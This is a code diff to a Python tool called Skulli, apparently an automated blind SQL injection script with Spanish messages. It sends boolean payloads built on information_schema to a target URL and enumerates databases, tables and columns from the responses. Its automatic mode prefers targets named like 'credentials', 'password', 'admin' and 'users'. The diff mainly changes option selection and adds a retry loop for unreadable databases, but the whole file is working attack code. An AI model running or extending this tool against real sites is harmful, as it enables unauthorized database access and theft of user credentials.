@@ -50,7 +50,6 @@ class Skulli:
         self.old_data = self.data[self.skll]
         
     def create_log(self,header,logs,separator=','):
-        print(separator)
         log_name = f'{self.log}.txt'
         if path.exists(log_name) and header == 'Databases':
             remove(log_name)
@@ -62,9 +61,10 @@ class Skulli:
             print(e)
         
     def set_options(self,options):
-        list_options = options.split(',')
+        if type(options) != list:
+            list_options = options.split(',')
         lower_options = [word.lower() for word in list_options]
-        good_words = ['users', 'login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id']
+        good_words = ['test','users', 'login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id']
         
         if len(options) == 1:
             return 0
@@ -74,10 +74,14 @@ class Skulli:
                 index = lower_options.index(word)
                 good_words.pop(index)
                 return index
+        
         return self.which_options(options)
 
     def which_options(self,options):
-        options = options.split(',')
+        if type(options) != list:
+            options = options.split(',')
+            
+        old_options = options.copy()
 
         if len(options) == 1:
             return 0
@@ -93,12 +97,16 @@ class Skulli:
             if select_option > (len(options) - 1) or select_option < 0:
                 print('[!] Opcion invalida')
             else:
+                options.pop(select_option)
                 break
-        return select_option
+        return select_option,old_options,options
 
     def length_value(self, length):
         if length == None and not self.automatic:
-            print('Ocurrio un error a la hora de la inyeccion, puede que no tenga permisos para leer esa base de datos/tabla/columna.')
+            print('Ocurrio un error, puede que no tenga permisos para leer esa base de datos/tabla/columna. Elija otra opcion')
+            return None
+        else:
+            return length
 
     def condition_of_request(self, match):
         if match.isdigit():
@@ -198,11 +206,11 @@ class Skulli:
         for i in range(1,200):
             length = f"' or length((select group_concat(table_name) from information_schema.tables where table_schema='{db}'))={i}-- -"
             self.data[self.skll] += length
-            
+        
             if self.method == 'post':
                 r = requests.post(self.url, data=self.data, headers=self.headers)
             else:
-                 r = requests.get(self.url, params=self.data, headers=self.headers)
+                r = requests.get(self.url, params=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
             if condition == 'status_code':
                 if r.status_code != self.match:
@@ -218,7 +226,6 @@ class Skulli:
                         ln = i
                         break
         self.data[self.skll] = self.old_data
-        self.length_value(ln)
         return ln
 
     def get_tables(self, tb_len, db):
@@ -413,14 +420,25 @@ class Skulli:
     def initial(self):
         p1 = print('[+] Iniciando SkullI')
         time.sleep(2)
-        databases = self.get_databases(self.get_databases_len())
-        option1 = self.which_options(databases) if not self.automatic else self.set_options(databases)
+        len1 = self.get_databases_len()
+        databases = self.get_databases(len1)
+        option1,old_dbs,new_dbs = self.which_options(databases) if not self.automatic else self.set_options(databases)
         database = databases.split(',')[option1]
+        
+        while True:
+            option1,old_dbs,new_dbs = self.which_options(new_dbs) if not self.automatic else self.set_options(new_dbs)
+            database = old_dbs[option1]
 
-        print('\n')
+            print('\n')
 
-        tables = self.get_tables(self.get_tables_len(database), database)
-        option2 = self.which_options(tables) if not self.automatic else self.set_options(tables)
+            len2 = self.get_tables_len(database)
+            if len2 == None:
+                pass
+                # print('[!] Ocurrio un error, puede que no tenga permisos para esa base de datos/tabla/columns, elija otra')
+            else:
+                tables = self.get_tables(self.get_tables_len(database), database)
+                break
+        option2,old_tbs,new_tbs = self.which_options(tables) if not self.automatic else self.set_options(tables)
         table = tables.split(',')[option2]
 
         print('\n')
@@ -443,4 +461,3 @@ def start():
     url,method,headers,data,skll,match = get_data(json_file)
     sk = Skulli(url,method,headers,data,skll,match,automatic,log,recursive)
     sk.initial()
-    
